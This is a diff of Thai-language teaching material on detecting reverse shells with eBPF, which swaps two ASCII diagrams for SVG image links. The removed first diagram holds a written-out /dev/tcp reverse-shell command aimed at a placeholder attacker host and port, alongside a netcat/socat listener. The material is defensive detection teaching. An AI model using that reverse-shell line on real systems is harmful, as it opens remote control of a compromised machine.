@@ -26,18 +26,7 @@
 
 ### 1.1 Reverse shell ทำงานอย่างไร
 
-```
- เครื่องเหยื่อ (ถูกเจาะ)                                     เครื่องผู้โจมตี
- ┌────────────────────────────────────────┐              ┌────────────────────┐
- │ web app ──(command injection)──► bash  │              │  listener :4444    │
- │   bash -c 'exec 3<>/dev/tcp/ATK/4444;  │   TCP        │  (nc -l / socat)   │
- │            exec sh <&3 >&3 2>&3'       │ ───────────► │                    │
- │                                        │              │  พิมพ์คำสั่ง ──────►│
- │   sh:  fd0 = socket ◄──────────────────┼──────────────┤                    │
- │        fd1 = socket ───────────────────┼─────────────►│  เห็นผลลัพธ์        │
- │        fd2 = socket                    │              └────────────────────┘
- └────────────────────────────────────────┘
-```
+![การทำงานของ reverse shell](../../docs/diagrams/week15-reverse-shell.svg)
 
 หัวใจของ reverse shell คือ **การนำ socket มาเป็น stdin/stdout ของ shell** (ด้วย `dup2()` หรือ redirection) ดังนั้นการตรวจ "ชนิดของ fd 0/1/2" ณ จังหวะ `exec` จึงเป็นสัญญาณที่แข็งแรงกว่าการดูชื่อโปรแกรมมาก
 
@@ -60,21 +49,7 @@
 
 ### 1.3 เดินพอยน์เตอร์ในเคอร์เนลด้วย CO-RE: fd → socket family
 
-```
- struct task_struct *task = bpf_get_current_task()
-        │ ->files
-        ▼
- struct files_struct ──->fdt──► struct fdtable { max_fds, struct file **fd }
-                                                   │ fd[0], fd[1], fd[2]
-                                                   ▼
-                                     struct file { f_inode, private_data, ... }
-                                       │ ->f_inode->i_mode        │ ->private_data
-                                       ▼                          ▼
-                              (i_mode & S_IFMT) == S_IFSOCK ?   struct socket ->sk
-                                                                   ▼
-                                                    sk->__sk_common.skc_family
-                                                    == AF_INET (2) / AF_INET6 (10) ?
-```
+![การเดินพอยน์เตอร์จาก task_struct ถึง socket family](../../docs/diagrams/week15-fd-walk.svg)
 
 ทุกขั้นอ่านด้วย `BPF_CORE_READ()` ซึ่ง (1) ใช้ `bpf_probe_read_kernel` อย่างปลอดภัย และ (2) บันทึก CO-RE relocation ให้ offset ของ `files`, `fdt`, `f_inode`, `private_data` ฯลฯ ถูกแก้ให้ตรงกับเคอร์เนลปลายทาง ไม่ต้องประกาศ `struct task_struct___core` เองแบบเวอร์ชันเดิม (ซึ่งเสี่ยงหากชื่อ/ชนิดฟิลด์ไม่ตรง)
 
